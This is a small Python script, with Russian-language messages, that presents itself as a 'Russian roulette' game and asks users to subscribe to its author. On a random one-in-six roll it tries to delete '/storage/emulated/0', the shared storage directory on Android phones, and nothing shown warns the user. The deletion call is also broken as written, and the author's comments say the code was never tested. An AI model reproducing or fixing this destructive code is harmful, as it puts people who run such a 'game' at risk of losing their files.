import random
import os
import time

print ("\033[32mДобро пожаловать в Русскую рулетку v1.0!")
time.sleep(1.50)
print ("\033[33mЕсли произошли какие либо ошибки ,сообщите мне @XitDev")

if random.randint(0, 5) ==1:
	os.remove("/storage/emulated/0")
time.sleep(2.90)
print("\033[36mSubscribe to the author of Russian roulette!\n@XitDev")
	
	
#Если что то не правильно тут ,то исправьте пж
#Я не проверял  